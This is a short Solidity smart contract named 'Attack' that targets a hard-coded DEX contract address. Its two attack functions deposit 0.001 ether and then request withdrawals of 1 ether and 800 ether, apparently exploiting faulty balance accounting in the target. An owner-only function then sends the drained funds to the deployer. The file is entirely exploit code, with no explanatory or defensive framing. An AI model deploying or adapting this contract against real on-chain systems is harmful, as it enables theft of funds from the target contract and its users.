// SPDX-License-Identifier: MIT
pragma solidity ^0.8;


interface Dex {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    address public owner = msg.sender;
    address public dex = 0x9a2d163aB40F88C625Fd475e807Bbc3556566f80;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
   
function attack1() external payable {
        Dex(dex).deposit{value: 0.001 ether}();
        Dex(dex).withdraw(1e18);

    }

function attack800() external payable {
        Dex(dex).deposit{value: 0.001 ether}();
        Dex(dex).withdraw(800 ether);

    }


    receive() external payable {
        
    }

function withdraw(uint256 amount) external onlyOwner {
        payable(owner).transfer(amount);
    }
}